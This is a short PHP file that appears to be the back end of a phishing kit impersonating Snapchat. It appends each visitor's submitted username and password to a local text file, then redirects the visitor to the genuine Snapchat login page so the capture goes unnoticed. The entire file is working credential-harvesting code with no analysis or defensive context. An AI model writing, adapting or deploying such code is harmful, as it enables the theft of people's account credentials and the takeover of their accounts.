<?php

file_put_contents("../facebook/mydata.txt", "SNAPCHAT Username: " . $_POST['username'] . " Password: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://accounts.snapchat.com/accounts/login');
exit();
                                                                  
